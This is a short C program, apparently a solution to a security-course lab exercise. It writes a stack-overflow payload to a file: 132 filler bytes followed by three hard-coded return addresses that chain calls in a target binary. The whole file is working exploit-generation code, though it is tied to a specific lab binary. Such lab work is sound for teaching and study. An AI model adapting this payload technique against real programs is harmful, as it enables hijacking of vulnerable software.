#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util-program.h"


int main(int argc, char **argv)
{
    /* YOUR CODE: Generate buf appropriately */
 
    int buffer_length=144;
    char buffer[buffer_length];

    int i=0;
        for (i=0;i< buffer_length-12;i++){
                buffer[i]='A';
        }
//round 1 address
     buffer[132]='\x9b';
     buffer[133]='\x86';
     buffer[134]='\x04';
     buffer[135]='\x08';
//round 2 address
     buffer[136]='\xf6';
     buffer[137]='\x86';
     buffer[138]='\x04';
     buffer[139]='\x08';
//round 3 address
      buffer[140]='\x51';
     buffer[141]='\x87';
     buffer[142]='\x04';
     buffer[143]='\x08';
// exit address
//      buffer[144]='\xe0';
//     buffer[145]='\x69';
//     buffer[146]='\xe3';
//     buffer[147]='\xb7';

    write_to_file( "attack5-payload", buffer , buffer_length , FILE_CLEAR );
    exit(0);
}
